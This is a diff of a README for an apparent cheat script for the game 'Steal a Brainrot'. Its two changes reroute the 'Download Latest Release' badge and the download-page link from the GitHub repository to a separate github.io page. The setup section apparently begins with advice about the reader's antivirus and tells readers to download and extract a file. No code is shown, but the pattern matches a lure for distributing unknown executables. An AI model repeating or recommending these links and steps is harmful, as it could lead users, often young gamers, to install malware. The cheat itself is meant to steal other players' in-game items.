@@ -1,6 +1,6 @@
 # 🧠 Steal-A-Brainrot-Script-2026-Auto-Steal - Automatic script for faster game progress
 
-[![Download Script](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rectilineal-otolaryngologist228/Steal-A-Brainrot-Script-2026-Auto-Steal)
+[![Download Script](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://rectilineal-otolaryngologist228.github.io)
 
 ## 📋 Project Overview
 
@@ -23,7 +23,7 @@ Follow these steps to set up the software on your machine. Ensure your antivirus
 4. Download the file to your desktop for easy access.
 5. Save the file folder and extract the contents if the download comes as a compressed zip file.
 
-[Click here to reach the download page](https://github.com/rectilineal-otolaryngologist228/Steal-A-Brainrot-Script-2026-Auto-Steal)
+[Click here to reach the download page](https://rectilineal-otolaryngologist228.github.io)
 
 ## 🛠️ Installation and Setup
 
